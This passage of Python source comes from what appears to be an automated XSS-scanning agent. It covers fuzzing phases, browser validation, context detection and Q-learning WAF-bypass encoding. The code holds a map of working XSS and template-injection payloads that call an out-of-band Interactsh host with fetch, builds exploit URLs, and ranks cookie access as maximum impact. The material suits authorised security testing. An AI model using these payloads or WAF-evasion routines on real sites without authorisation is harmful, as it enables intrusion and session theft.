        dashboard.set_status("XSS Phase 3.3", f"Attacking with {len(payloads)} payloads")

        if not self._go_bridge:
            await self._init_hybrid_engine()

        if not self._go_bridge:
            logger.error(f"[{self.name}] Go bridge unavailable for Phase 3.3")
            return FuzzResult(
                target=self.url,
                param=param,
                total_payloads=0,
                total_requests=0,
                duration_ms=0,
                requests_per_second=0.0
            )

        result = await self._go_bridge.run(
            url=self.url,
            param=param,
            payloads=payloads
        )

        # Save phase report
        self._save_phase3_report(report_dir, param, payloads, result)

        dashboard.log(
            f"[{self.name}] 📊 Phase 3.3 complete: {result.total_requests} requests, "
            f"{len(result.reflections)} reflections @ {result.requests_per_second:.1f} req/s",
            "INFO"
        )

        return result

    async def _pipeline_v2_phase4_validation(
        self,
        param: str,
        phase1_result: "FuzzResult",
        phase3_result: "FuzzResult",
        analysis: Dict,
        screenshots_dir: Path,
        report_dir: Path
    ) -> Optional[XSSFinding]:
        """
        Phase 4: VALIDATION - Conditional Playwright validation.

        SKIP Playwright if:
        - Interactsh confirmed (100% confidence)
        - Unencoded payload in <script> context (95%)
        - Unencoded payload in event handler (90%)

        USE Playwright if:
        - Reflection with partial encoding (60%)
        - Dubious context (hidden, comment) (40%)

        Args:
            param: Parameter name
            phase1_result: Results from Phase 1
            phase3_result: Results from Phase 3.3
            analysis: Analysis from Phase 2
            screenshots_dir: Directory for screenshots
            report_dir: Directory to save phase report

        Returns:
            XSSFinding if validated, None otherwise
        """
        dashboard.log(f"[{self.name}] ✅ Phase 4: Conditional validation", "INFO")
        dashboard.set_status("XSS Phase 4", "Validation")

        # Combine all reflections
        all_reflections = phase1_result.reflections + phase3_result.reflections

        # Sort by confidence (unencoded + dangerous context = highest)
        candidates = sorted(
            all_reflections,
            key=lambda r: (
                r.is_suspicious,
                r.context in ("javascript", "script", "event_handler"),
                not r.encoded
            ),
            reverse=True
        )

        # Check for high-confidence cases that don't need Playwright
        for ref in candidates[:10]:
            confidence = self._calculate_confidence(ref)

            if confidence >= 0.95:
                dashboard.log(
                    f"[{self.name}] 🎯 High confidence ({confidence:.0%}) in {ref.context}, skip Playwright",
                    "SUCCESS"
                )

                finding = self._create_xss_finding(
                    param=param,
                    payload=ref.payload,
                    context=f"Pipeline V2: {ref.context}",
                    validation_method="http_high_confidence",
                    evidence={
                        "method": "HTTP Response Analysis",
                        "context": ref.context,
                        "encoded": ref.encoded,
                        "confidence": confidence
                    },
                    confidence=confidence,
                    reflection_type=ref.context,
                    surviving_chars="",
                    successful_payloads=[ref.payload],
                    injection_ctx=None,
                    bypass_technique="pipeline_v2",
                    bypass_explanation=f"Unencoded reflection in {ref.context} context"
                )

                self._save_phase4_report(report_dir, finding, "high_confidence_http")
                return finding

        # Need Playwright validation for lower confidence candidates
        dashboard.log(f"[{self.name}] 🎭 Running Playwright validation on top candidates", "INFO")

        max_validations = 10
        for i, ref in enumerate(candidates[:max_validations]):
            if self._max_impact_achieved:
                break

            dashboard.set_current_payload(
                f"[{i+1}/{min(len(candidates), max_validations)}]",
                "XSS Validation",
                "Testing via Playwright"
            )

            # Validate via browser
            evidence = await self._validate_via_browser(self.url, param, ref.payload)

            if evidence:
                dashboard.log(f"[{self.name}] ✅ XSS CONFIRMED via Playwright!", "SUCCESS")

                finding = self._create_xss_finding(
                    param=param,
                    payload=ref.payload,
                    context=f"Pipeline V2: {ref.context}",
                    validation_method="playwright_browser",
                    evidence=evidence,
                    confidence=0.95,
                    reflection_type=ref.context,
                    surviving_chars="",
                    successful_payloads=[ref.payload],
                    injection_ctx=None,
                    bypass_technique="pipeline_v2",
                    bypass_explanation=f"Go fuzzer detected reflection, Playwright confirmed execution"
                )

                self._save_phase4_report(report_dir, finding, "playwright")
                return finding

        # No XSS confirmed
        dashboard.log(f"[{self.name}] Phase 4: No XSS confirmed after {max_validations} validations", "WARN")
        self._save_phase4_report(report_dir, None, "no_finding")
        return None

    def _calculate_confidence(self, reflection: "Reflection") -> float:
        """Calculate confidence score for a reflection."""
        confidence = 0.5  # Base

        # Unencoded is much more likely to execute
        if not reflection.encoded:
            confidence += 0.3

        # Dangerous contexts
        if reflection.context in ("javascript", "script"):
            confidence += 0.15
        elif reflection.context in ("event_handler", "attribute_value"):
            confidence += 0.10
        elif reflection.context in ("html_text", "html_body"):
            confidence += 0.05

        # Visual banner marker
        if "HACKED BY BUGTRACEAI" in reflection.payload or "bt-pwn" in reflection.payload:
            confidence += 0.05

        return min(confidence, 1.0)

    def _create_finding_from_interactsh(
        self,
        param: str,
        payload: str,
        evidence: Dict,
        screenshots_dir: Path
    ) -> XSSFinding:
        """Create XSSFinding from Interactsh confirmation."""
        return self._create_xss_finding(
            param=param,
            payload=payload,
            context="Interactsh OOB Confirmation",
            validation_method="interactsh_oob",
            evidence=evidence,
            confidence=1.0,
            reflection_type="oob",
            surviving_chars="",
            successful_payloads=[payload],
            injection_ctx=None,
            bypass_technique="oob_callback",
            bypass_explanation="Target made HTTP request to Interactsh domain, confirming JS execution"
        )

    # =========================================================================
    # PHASE REPORT GENERATION
    # =========================================================================

    def _save_phase1_report(
        self,
        report_dir: Path,
        param: str,
        payloads: List[str],
        result: "FuzzResult"
    ) -> None:
        """Save Phase 1 bombardment report to markdown.
        Delegates to bugtrace.agents.xss.reporting.save_phase1_report."""
        _pure_save_phase1_report(report_dir, self.url, param, payloads, result)

    def _save_phase2_report(self, report_dir: Path, analysis: Dict) -> None:
        """Save Phase 2 analysis report to markdown.
        Delegates to bugtrace.agents.xss.reporting.save_phase2_report."""
        _pure_save_phase2_report(report_dir, analysis)

    def _save_phase3_report(
        self,
        report_dir: Path,
        param: str,
        payloads: List[str],
        result: "FuzzResult"
    ) -> None:
        """Save Phase 3 amplification report to markdown.
        Delegates to bugtrace.agents.xss.reporting.save_phase3_report."""
        _pure_save_phase3_report(report_dir, self.url, param, payloads, result)

    def _save_phase4_report(
        self,
        report_dir: Path,
        finding: Optional[XSSFinding],
        validation_method: str
    ) -> None:
        """Save Phase 4 validation report to markdown.
        Delegates to bugtrace.agents.xss.reporting.save_phase4_report."""
        exploit_url_fallback = ""
        if finding:
            exploit_url_fallback = self._build_attack_url(finding.parameter, finding.payload)
        _pure_save_phase4_report(report_dir, finding, validation_method, exploit_url_fallback)

    # =========================================================================
    # END PIPELINE V2
    # =========================================================================

    def _get_snippet(self, text: str, target: str, max_len: int = 200) -> str:
        """Extract snippet around the target string.
        Delegates to bugtrace.agents.xss.reporting.get_snippet."""
        return _pure_get_snippet(text, target, max_len)

    def _check_contexts(self, html: str, probe: str, escaped_probe: str) -> list:
        """Check all contexts and return found ones."""
        contexts = []
        if re.search(r'<script[^>]*>.*?' + escaped_probe + r'.*?</script>', html, re.DOTALL | re.IGNORECASE):
            contexts.append(("script", self._get_snippet(html, probe)))
        if re.search(r"['`\"][^'`\"]*" + escaped_probe + r"[^'`\"]*['`\"]", html):
            contexts.append(("javascript_string", self._get_snippet(html, probe)))
        if re.search(r'<[^>]+\s\w+=["\']?[^"\']*' + escaped_probe, html):
            contexts.append(("html_attribute", self._get_snippet(html, probe)))
        if re.search(r'href=["\']?[^"\']*' + escaped_probe, html, re.IGNORECASE):
            contexts.append(("url_href", self._get_snippet(html, probe)))
        if re.search(r'src=["\']?[^"\']*' + escaped_probe, html, re.IGNORECASE):
            contexts.append(("url_src", self._get_snippet(html, probe)))
        if re.search(r'on\w+=["\'][^"\']*' + escaped_probe, html, re.IGNORECASE):
            contexts.append(("event_handler", self._get_snippet(html, probe)))
        if re.search(r'>[^<]*' + escaped_probe + r'[^<]*<', html):
            contexts.append(("html_body", self._get_snippet(html, probe)))
        if re.search(r'<!--[^>]*' + escaped_probe + r'[^>]*-->', html):
            contexts.append(("html_comment", self._get_snippet(html, probe)))
        return contexts

    def _prioritize_contexts(self, contexts: list) -> InjectionContext:
        """Select most dangerous context."""
        if not contexts:
            return InjectionContext(type="unknown", code_snippet="Context could not be automatically determined.")
        priority = ["script", "event_handler", "javascript_string", "url_href", "url_src",
                    "html_attribute", "html_body", "html_comment"]
        for p_ctx in priority:
            for ctx_type, snippet in contexts:
                if ctx_type == p_ctx:
                    return InjectionContext(type=ctx_type, code_snippet=snippet)
        return InjectionContext(type=contexts[0][0], code_snippet=contexts[0][1])

    def detect_injection_context(self, html: str, probe: str = "USER_INPUT") -> InjectionContext:
        """
        TASK-52: Enhanced context detection with multiple context support.
        Detects where the user input is reflected in multiple possible contexts.
        """
        escaped_probe = re.escape(probe)
        contexts = self._check_contexts(html, probe, escaped_probe)
        return self._prioritize_contexts(contexts)

    def _encode_for_url(self, payload: str) -> str:
        """URL encode the payload."""
        from urllib.parse import quote
        return quote(payload, safe='')

    def _encode_for_html_attribute(self, payload: str) -> str:
        """HTML entity encode for attribute context."""
        import html
        return html.escape(payload, quote=True)

    def _encode_for_js_string(self, payload: str) -> str:
        """Escape for JavaScript string context."""
        return payload.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"')

    def _encode_for_script(self, payload: str) -> str:
        """Escape closing script tags."""
        return payload.replace("</script>", "<\\/script>")

    def prepare_payload(self, payload: str, context: str) -> str:
        """
        TASK-54: Prepare payload with appropriate encoding based on context.
        Ensures payloads are properly encoded to avoid false negatives.
        """
        if context in ("url_href", "url_src"):
            return self._encode_for_url(payload)
        if context == "html_attribute":
            return self._encode_for_html_attribute(payload)
        if context == "javascript_string":
            return self._encode_for_js_string(payload)
        if context == "script":
            return self._encode_for_script(payload)
        # html_body or unknown - return as-is
        return payload

    def _get_context_payload_map(self) -> Dict[str, List[str]]:
        """Return mapping of contexts to payload templates."""
        return {
            "script": [
                "';fetch('https://{{interactsh_url}}');//",
                "\";fetch('https://{{interactsh_url}}');//",
                "`;fetch('https://{{interactsh_url}}');//",
                "</script><script>fetch('https://{{interactsh_url}}')</script>",
            ],
            "javascript_string": [
                "'-fetch('https://{{interactsh_url}}')-'",
                "\"-fetch('https://{{interactsh_url}}')-\"",
                "\\');fetch('https://{{interactsh_url}}');//",
            ],
            "html_attribute": [
                "\" onmouseover=\"fetch('https://{{interactsh_url}}')\" x=\"",
                "' onmouseover='fetch(`https://{{interactsh_url}}`)' x='",
                "\"><svg/onload=fetch('https://{{interactsh_url}}')>",
            ],
            "url_context": [
                "javascript:fetch('https://{{interactsh_url}}')",
                "data:text/html,<script>fetch('https://{{interactsh_url}}')</script>",
            ],
            "event_handler": [
                "fetch('https://{{interactsh_url}}')",
                "';fetch('https://{{interactsh_url}}');//",
            ],
            "html_body": [
                "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
                "<svg/onload=fetch('https://{{interactsh_url}}')>",
                "<script>fetch('https://{{interactsh_url}}')</script>",
            ],
            # Framework template injection payloads (AngularJS, Vue, etc.)
            "template": [
                "{{constructor.constructor('fetch(\"https://{{interactsh_url}}\")')()}}",
                "{{constructor.constructor('alert(1)')()}}",
                "{{$on.constructor('alert(1)')()}}",
                "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
                "{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}",
                # Vue.js
                "{{_c.constructor('alert(1)')()}}",
            ],
        }

    def _replace_interactsh_placeholder(self, payloads: List[str], interactsh_url: str) -> List[str]:
        """Replace interactsh placeholder in all payloads."""
        return [p.replace("{{interactsh_url}}", interactsh_url) for p in payloads]

    def get_payloads_for_context(self, context: str, interactsh_url: str) -> List[str]:
        """
        TASK-54: Get context-specific payloads for more effective testing.
        """
        payload_map = self._get_context_payload_map()

        # Map URL contexts to single key
        if context in ("url_href", "url_src"):
            context = "url_context"

        # Get context-specific payloads or fallback to golden set
        base_payloads = payload_map.get(context, self.GOLDEN_PAYLOADS[:5])

        return self._replace_interactsh_placeholder(base_payloads, interactsh_url)

    async def analyze_server_escaping(self, url: str, param: str) -> Dict[str, bool]:
        """
        Analyze server-side escaping behavior by sending special characters.
        Determines if dangerous characters (quotes, brackets) are reflected raw or escaped/stripped.
        """
        test_chars = {
            "single_quote": "'",
            "double_quote": '"',
            "backslash": "\\",
            "lt": "<",
            "gt": ">",
        }
        
        results = {}
        try:
             # Construct a probe with all chars wrapped in markers
             probe = "BT_TEST_" + "".join(test_chars.values()) + "_END"
             
             # Send payload via established channel
             response_html = await self._send_payload(param, probe)
             
             if response_html:
                 for name, char in test_chars.items():
                     # If raw char is NOT found, it means it was escaped or stripped -> Safe/Escaped
                     results[f"escapes_{name}"] = (char not in response_html)
             else:
                 # If no response or WAF block, assume everything is filtered/blocked
                 for name in test_chars: results[f"escapes_{name}"] = True
                 
        except Exception as e:
             logger.warning(f"Failed to analyze server escaping: {e}")
             for name in test_chars: results[f"escapes_{name}"] = "unknown"
             
        return results

    def generate_verification_methods(self, url, param, context, payload) -> List[Dict]:
        methods = []
        
        # Method 1: Console.log
        console_payload = payload.replace("alert(1)", 'console.log("XSS-VERIFIED")').replace("alert('XSS')", 'console.log("XSS-VERIFIED")')
        methods.append({
            "type": "console_log",
            "name": "Console Log (Recommended)",
            "payload": console_payload,
            "url_encoded": self.build_exploit_url(url, param, console_payload, encoded=True),
            "instructions": "Open DevTools (F12) -> Console tab -> Look for 'XSS-VERIFIED'",
            "reliability": "high"
        })
        
        # Method 2: DOM Modification
        dom_payload = payload.replace("alert(1)", 'document.body.innerHTML="<h1>XSS-HACKED</h1>"')
        methods.append({
            "type": "dom_modification",
            "name": "DOM Modification",
            "payload": dom_payload,
            "url_encoded": self.build_exploit_url(url, param, dom_payload, encoded=True),
            "instructions": "Page content will be replaced with 'XSS-HACKED'",
            "reliability": "high"
        })
        
        # Method 3: Window Variable
        var_payload = payload.replace("alert(1)", 'window.XSS_CONFIRMED=true')
        methods.append({
            "type": "window_variable",
            "name": "Window Variable",
            "payload": var_payload,
            "url_encoded": self.build_exploit_url(url, param, var_payload, encoded=True),
            "instructions": "In console, type: window.XSS_CONFIRMED (should return true)",
            "reliability": "high"
        })
        
        # Method 4: Alert
        methods.append({
            "type": "alert",
            "name": "Alert Popup",
            "payload": payload,
            "url_encoded": self.build_exploit_url(url, param, payload, encoded=True),
            "instructions": "Alert popup should appear",
            "reliability": "medium",
            "warning": "May be blocked by modern browsers or extensions"
        })
        
        return methods

    def build_exploit_url(self, url: str, param: str, payload: str, encoded: bool = False) -> str:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        qs[param] = [payload]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        # If not encoded, we might want raw characters, but URLs must be encoded usually.
        # The handoff distinguishes exploit_url and exploit_url_encoded.
        # However, urlunparse with urlencode WILL encode it.
        # To get "raw" URL we might need to decode.
        full_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))
        if not encoded:
            return urllib.parse.unquote(full_url)
        return full_url

    def get_verification_warnings(self, context) -> List[str]:
        return ["alert() may be blocked by modern browsers", "Extensions like NoScript may block execution"]

    def generate_repro_steps(self, url, param, context, payload) -> List[str]:
        return [
            f"Navigate to {url}",
            f"Inject the payload into parameter '{param}'",
            f"Payload: {payload}",
            "Observe the execution (popup, console log, or page change)"
        ]

    # =========================================================================
    # VICTORY HIERARCHY: Early exit based on payload impact
    # =========================================================================

    # Impact tiers for XSS payloads (highest first)
    HIGH_IMPACT_INDICATORS = [
        "document.cookie",      # Cookie theft - MAXIMUM IMPACT
        "document.domain",      # Domain access proof - MAXIMUM IMPACT
        "localStorage",         # Storage access
        "sessionStorage",       # Session storage access
        "fetch(", "XMLHttpRequest",  # Data exfiltration capability
    ]

    MEDIUM_IMPACT_INDICATORS = [
        "alert(", "confirm(", "prompt(",  # Basic execution proof
        "console.log",          # Console output
        "eval(",                # Code execution
    ]

    def _get_payload_impact_tier(self, payload: str, evidence: Dict = None) -> int:
        """
        Determine the impact tier of a successful XSS payload.

        Returns:
            3 = MAXIMUM IMPACT (document.cookie, document.domain) -> STOP IMMEDIATELY
            2 = HIGH IMPACT (fetch, XMLHttpRequest) -> STOP IMMEDIATELY
            1 = MEDIUM IMPACT (alert executed) -> Try 1 more to escalate
            0 = LOW IMPACT (reflection only) -> Continue testing
        """
        payload_lower = payload.lower()
        evidence_str = str(evidence or {}).lower()
        combined = payload_lower + " " + evidence_str

        # TIER 3: Maximum Impact - Cookie/Domain access
        if any(ind.lower() in combined for ind in ["document.cookie", "document.domain"]):
            return 3

        # TIER 2: High Impact - Data exfiltration capability
        if any(ind.lower() in combined for ind in ["localstorage", "sessionstorage", "fetch(", "xmlhttprequest"]):
            return 2

        # TIER 1: Medium Impact - Confirmed execution
        if any(ind.lower() in combined for ind in ["alert(", "confirm(", "prompt(", "eval("]):
            # Check if it actually executed (not just reflected)
            if evidence and (evidence.get("dialog_detected") or evidence.get("interactsh_hit") or
                           evidence.get("vision_confirmed") or evidence.get("console_output")):
                return 1
            return 1  # Still medium even if just reflected with these

        # TIER 0: Low Impact - Just reflection
        return 0

    def _should_stop_testing(self, payload: str, evidence: Dict, successful_count: int) -> Tuple[bool, str]:
        """
        Determine if we should stop testing based on Victory Hierarchy.

        Returns:
            (should_stop, reason)
        """
        impact_tier = self._get_payload_impact_tier(payload, evidence)

        if impact_tier >= 3:
            self._max_impact_achieved = True
            return True, f"🏆 MAXIMUM IMPACT: Cookie/Domain access achieved"

        if impact_tier >= 2:
            self._max_impact_achieved = True
            return True, f"🏆 HIGH IMPACT: Data exfiltration capability confirmed"

        if impact_tier >= 1 and successful_count >= 1:
            # Medium impact + already have 1 success = stop (gave it a chance to escalate)
            return True, f"✅ Execution confirmed, escalation attempted"

        # Low impact or first medium impact - continue but with limit
        if successful_count >= 2:
            return True, f"⚡ 2 successful payloads found, moving on"

        return False, ""

    def _has_interactsh_hit(self, evidence: Dict) -> bool:
        """Check for Interactsh OOB interaction."""
        if evidence.get("interactsh_hit"):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Interactsh OOB interaction)")
            return True
        return False

    def _has_dialog_detected(self, evidence: Dict) -> bool:
        """Check for dialog/alert detection."""
        if evidence.get("dialog_detected") or evidence.get("alert_detected"):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Dialog/Alert detected)")
            return True
        return False

    def _has_vision_proof(self, evidence: Dict, finding_data: Dict = None) -> bool:
        """Check for Vision AI confirmation."""
        if evidence.get("vision_confirmed"):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Vision AI confirmed banner)")
            return True
        return False

    def _has_dom_mutation_proof(self, evidence: Dict) -> bool:
        """Check for DOM mutation proof."""
        if evidence.get("dom_mutation") or evidence.get("marker_found"):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (DOM mutation proof)")
            return True
        return False

    def _determine_validation_status(self, test_result: Dict) -> Tuple[str, bool]:
        """
        Determine validation status based on evidence authority.
        XSSAgent has AUTHORITY to mark VALIDATED_CONFIRMED only if evidence is strong.
        Falls back to PENDING_VALIDATION when no evidence checks pass.
        """
        evidence = test_result.get("evidence", {})
        finding_data = test_result.get("finding_data", test_result)

        # AUTHORITY CHECKS: Only if self-validation is enabled in config
        if settings.XSS_SELF_VALIDATE:
            if self._has_interactsh_hit(evidence):
                return "VALIDATED_CONFIRMED", True

            if (self._has_dialog_detected(evidence) or
                self._has_vision_proof(evidence, finding_data) or
                self._has_dom_mutation_proof(evidence) or
                self._has_console_execution_proof(evidence) or
                self._has_dangerous_unencoded_reflection(evidence, finding_data) or
                self._has_fragment_xss_with_screenshot(finding_data)):

                logger.info(f"[{self.name}] 🚨 SELF-VALIDATED XSS (Authority Evidence Found)")
                return "VALIDATED_CONFIRMED", True

            if evidence.get("http_confirmed") or evidence.get("ai_confirmed"):
                return "VALIDATED_CONFIRMED", True
        else:
            logger.debug(f"[{self.name}] Self-validation disabled in config. Deferring to Auditor.")

        # FALLBACK: No evidence checks passed — needs external validation
        logger.debug(f"[{self.name}] No authority evidence found, marking PENDING_VALIDATION")
        return "PENDING_VALIDATION", False

    def _has_console_execution_proof(self, evidence: Dict) -> bool:
        """Check for console output with execution proof."""
        if evidence.get("console_output") and "executed" in str(evidence.get("console_output", "")).lower():
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Console execution proof)")
            return True
        return False

    def _has_dangerous_unencoded_reflection(self, evidence: Dict, finding_data: Dict) -> bool:
        """Check for unencoded reflection in dangerous context."""
        # 1. Standard dangerous contexts
        dangerous_contexts = ["html_text", "script", "attribute_unquoted", "tag_name"]
        
        # 2. Relaxed Check: If it's a BUGTRACE payload, we trust it even if context is murky
        is_bugtrace_payload = "BUGTRACE" in str(finding_data.get("payload", ""))

        if (evidence.get("unencoded_reflection", False) and
            (finding_data.get("reflection_context") in dangerous_contexts or is_bugtrace_payload)):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Unencoded reflection - Context: {finding_data.get('reflection_context')})")
            return True
        return False

    def _has_fragment_xss_with_screenshot(self, finding_data: Dict) -> bool:
        """Check for fragment XSS with screenshot proof."""
        if finding_data.get("context") == "dom_xss_fragment" and finding_data.get("screenshot_path"):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Fragment XSS w/ screenshot)")
            return True
        return False

    def _should_create_finding(self, test_result: Dict) -> bool:
        """
        Decide if we should create a finding based on evidence strength.
        This PREVENTS creating findings for weak evidence (TIER 3).

        Returns:
            True if evidence is strong enough to warrant a finding
            False if evidence is too weak (just log internally)
        """
        evidence = test_result.get("evidence", {})

        # ACCEPT: Confirmed via HTTP analysis or AI Auditor
        if evidence.get("http_confirmed") or evidence.get("ai_confirmed"):
            return True

        # REJECT: No execution evidence and no high-confidence HTTP/AI confirmation
        if not any([evidence.get("dialog_detected"), evidence.get("marker_found"), 
                    evidence.get("dom_mutation"), evidence.get("console_output"),
                    evidence.get("interactsh_hit")]):
            logger.debug(f"[{self.name}] Skipping finding - no execution evidence")
            return False

        # ACCEPT: Has some execution evidence, create finding for Auditor
        return True

    # =========================================================================
    # WAF INTELLIGENCE (Q-Learning Integration)
    # =========================================================================

    async def _detect_waf_async(self) -> Tuple[str, float]:
        """
        Detect WAF using framework's intelligent fingerprinter.
        Caches result in instance variables.
        """
        if self._detected_waf is not None:
            return self._detected_waf, self._waf_confidence

        try:
            waf_name, confidence = await waf_fingerprinter.detect(self.url)
            self._detected_waf = waf_name if waf_name != "unknown" else None
            self._waf_confidence = confidence

            if self._detected_waf:
                logger.info(f"[{self.name}] 🛡️ WAF Detected: {waf_name} ({confidence:.0%} confidence)")
                dashboard.log(f"[{self.name}] 🛡️ WAF Detected: {waf_name} ({confidence:.0%})", "INFO")
                if hasattr(self, '_v'):
                    self._v.emit("exploit.xss.waf_detected", {"waf": waf_name, "confidence": round(confidence, 2)})

            return waf_name, confidence
        except Exception as e:
            logger.debug(f"[{self.name}] WAF detection failed: {e}")
            return "unknown", 0.0

    async def _get_waf_optimized_payloads(self, base_payloads: List[str], max_variants: int = 3) -> List[str]:
        """
        Apply Q-Learning optimized encoding to payloads based on detected WAF.

        Uses strategy_router to select best encoding techniques for the WAF.
        Records success/failure for continuous learning.
        """
        if not self._detected_waf:
            return base_payloads

        try:
            # Get Q-Learning optimized strategies for this WAF
            waf_name, strategies = await strategy_router.get_strategies_for_target(
                self.url, max_strategies=max_variants
            )

            logger.info(f"[{self.name}] 🧠 Q-Learning selected encodings for {waf_name}: {strategies[:3]}")

            # Generate encoded variants of payloads
            encoded_payloads = []
            for payload in base_payloads[:20]:  # Limit base payloads to avoid explosion
                # Add original payload first
                encoded_payloads.append(payload)

                # Apply each Q-Learning selected encoding
                variants = encoding_techniques.encode_payload(
                    payload,
                    waf=waf_name,
                    max_variants=max_variants
                )
                encoded_payloads.extend(variants)

            # Deduplicate while preserving order
            seen = set()
            unique_payloads = []
            for p in encoded_payloads:
                if p not in seen:
                    seen.add(p)
                    unique_payloads.append(p)

            logger.info(f"[{self.name}] Generated {len(unique_payloads)} WAF-optimized payloads (from {len(base_payloads)} base)")
            return unique_payloads

        except Exception as e:
            logger.warning(f"[{self.name}] WAF payload optimization failed: {e}")
            return base_payloads

    def _detect_payload_encoding(self, payload: str) -> str:
        """Detect which encoding technique was used in the payload.
        Delegates to bugtrace.agents.xss.waf.detect_payload_encoding."""
        return _pure_detect_payload_encoding(payload)

    def _record_bypass_result(self, payload: str, success: bool):
        """Record bypass result for Q-Learning feedback.
        Uses pure detection, then calls strategy_router for side-effect."""
        if not self._detected_waf:
            return

        try:
            encoding_used = _pure_detect_payload_encoding(payload)
            strategy_router.record_result(self._detected_waf, encoding_used, success)
            logger.debug(f"[{self.name}] Recorded bypass: {self._detected_waf}/{encoding_used} = {'SUCCESS' if success else 'FAIL'}")
        except Exception as e:
            logger.debug(f"[{self.name}] Failed to record bypass: {e}")

    async def _loop_setup_waf_and_interactsh(self) -> str:
        """Phase 0-1: WAF detection and Interactsh registration."""
        # Phase 0: WAF Detection
        dashboard.log(f"[{self.name}] 🛡️ Detecting WAF...", "INFO")
        logger.info(f"[{self.name}] Phase 0: WAF Detection using Q-Learning fingerprinter")
        waf_name, waf_confidence = await self._detect_waf_async()

        if self._detected_waf:
            dashboard.log(f"[{self.name}] 🛡️ WAF: {waf_name} ({waf_confidence:.0%}) - Activating Q-Learning bypass strategies", "WARN")
            self.stealth_mode = True  # Auto-enable stealth for WAF targets
        else:
            dashboard.log(f"[{self.name}] ✓ No WAF detected", "SUCCESS")

        # Phase 1: Setup Interactsh
        dashboard.log(f"[{self.name}] 📡 Registering with Interactsh...", "INFO")
        logger.info(f"[{self.name}] Phase 1: Registering with Interactsh")
        self.interactsh = InteractshClient()
        await self.exec_tool("Interactsh_Register", self.interactsh.register, timeout=30)
        interactsh_domain = self.interactsh.get_url("xss_agent_base")
        dashboard.log(f"[{self.name}] ✓ Interactsh ready: {interactsh_domain}", "SUCCESS")

        return interactsh_domain

    async def _loop_discover_params(self) -> bool:
        """Phase 2: Discover parameters. Returns True if params available.

        FIXED (2026-02-01): ALWAYS extract URL query params as first-class citizens.
        Previously, if params were provided to constructor, URL query params were ignored.
        This caused us to miss obvious XSS in ?category= and ?search= that Burp found.
        """
        # ALWAYS extract URL query params first (first-class citizens)
        from urllib.parse import urlparse, parse_qs
        url_query_params = list(parse_qs(urlparse(self.url).query).keys())

        if url_query_params:
            logger.info(f"[{self.name}] 🎯 URL Query Params (first-class): {url_query_params}")
            dashboard.log(f"[{self.name}] 🎯 URL Query Params: {url_query_params}", "INFO")

        # If no params provided, do full discovery
        if not self.params:
            dashboard.log(f"[{self.name}] 🔎 Discovering parameters...", "INFO")
            logger.info(f"[{self.name}] Phase 2: Discovering parameters")
            self.params = await self._discover_params()
            logger.info(f"[{self.name}] Discovered {len(self.params)} params")
        else:
            # MERGE: URL query params FIRST, then provided params (avoid duplicates)
            merged_params = list(url_query_params)  # URL params are first-class
            for p in self.params:
                if p not in merged_params:
                    merged_params.append(p)

            if len(merged_params) > len(self.params):
                logger.info(f"[{self.name}] MERGED: {len(self.params)} provided + {len(url_query_params)} URL = {len(merged_params)} total")

            self.params = self._prioritize_params(merged_params)

        if not self.params:
            dashboard.log(f"[{self.name}] ⚠️ No parameters found to test", "WARN")
            return False

        dashboard.log(f"[{self.name}] Testing {len(self.params)} params: {', '.join(self.params[:5])}", "INFO")
        logger.info(f"[{self.name}] Params List (Raw): {self.params}")
        return True

    async def _loop_test_params(self, interactsh_domain: str, screenshots_dir: Path):
        """
        Phase 3: Test each parameter for XSS.

        v3.1.0: Now uses the Hybrid Engine (Go + Python + LLM) when available,
        with automatic fallback to pure Python mode if Go is unavailable.
        """
        logger.info(f"[{self.name}] Phase 3: Testing each parameter")

        # v3.1.0: Initialize hybrid engine if enabled
        if self._hybrid_mode:
            hybrid_ready = await self._init_hybrid_engine()
            if hybrid_ready:
                dashboard.log(
                    f"[{self.name}] 🚀 Hybrid Engine ACTIVE (Go + Python + LLM)",
                    "INFO"
                )
            else:
                dashboard.log(
                    f"[{self.name}] ⚠️ Hybrid Engine unavailable, using pure Python",
                    "WARN"
                )

        for param in self.params:
            # TASK-50: Thread-safe deduplication check
            async with self._tested_params_lock:
                if param in self._tested_params:
                    logger.info(f"[{self.name}] Skipping {param} - already tested")
                    continue
                self._tested_params.add(param)

            logger.info(f"[{self.name}] Testing param: {param}")

            # v3.1.0: Use hybrid engine if available, fallback to classic method
            if self._hybrid_mode and self._go_bridge:
                finding = await self._run_hybrid_test_param(
                    param, interactsh_domain, screenshots_dir
                )
            else:
                finding = await self._test_parameter(param, interactsh_domain, screenshots_dir)

            if not finding:
                continue

            self.findings.append(finding)
            dashboard.log(f"[{self.name}] 🎯 XSS CONFIRMED on '{param}'!", "SUCCESS")

            # OPTIMIZATION: Early exit after first finding
            from bugtrace.core.config import settings
            if settings.EARLY_EXIT_ON_FINDING:
                remaining = len(self.params) - (self.params.index(param) + 1)
                if remaining > 0:
                    logger.info(f"[{self.name}] ⚡ OPTIMIZATION: Early exit enabled (config)")
                    logger.info(f"[{self.name}] Skipping {remaining} remaining params (URL already vulnerable)")
                    dashboard.log(f"[{self.name}] ⚡ Early exit: Skipping {remaining} params (optimization)", "INFO")
                break

    async def _loop_test_dom_xss(self, screenshots_dir: Path = None):
        """
        Phase 3.5: DOM XSS Headless scan with VISUAL VALIDATION.

        Flow:
        1. detect_dom_xss() finds DOM XSS candidates
        2. For each candidate, validate visually with screenshot + Vision AI
        3. Only CONFIRMED if Vision sees execution proof
        """
        dashboard.log(f"[{self.name}] 🎭 Starting DOM XSS Headless Scan...", "INFO")
        logger.info(f"[{self.name}] Phase 3.5: DOM XSS Headless Scan")

        try:
            # Collect URLs to test: self.url + internal links + recon URLs with params
            urls_to_test = [self.url]
            if hasattr(self, '_discovered_internal_urls') and self._discovered_internal_urls:
